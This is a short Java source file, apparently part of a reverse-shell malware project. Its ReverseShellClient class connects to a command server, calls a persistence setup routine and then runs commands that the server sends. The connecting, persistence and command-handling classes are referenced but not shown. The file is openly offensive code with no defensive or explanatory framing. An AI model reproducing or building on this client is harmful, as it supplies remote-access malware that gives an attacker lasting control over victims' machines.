package obs1d1anc1ph3r.reverseshell;

import java.io.IOException;

public class ReverseShellClient {

    private final ServerConnection serverConnection;
    private final CommandHandler commandHandler;

    public ReverseShellClient(String serverIp, int serverPort) {
        this.serverConnection = new ServerConnection(serverIp, serverPort);
        this.commandHandler = new CommandHandler(serverConnection);
    }

    public void start() {
        try {
            serverConnection.connect();
            Persistence.setup();
            commandHandler.handleCommands();
        } catch (IOException e) {
            System.err.println("Connection error: " + e.getMessage());
        } finally {
            serverConnection.cleanup();
        }
    }

    public static void main(String[] args) {
        ReverseShellClient client = new ReverseShellClient("localhost", 2222);
        client.start();
    }
}
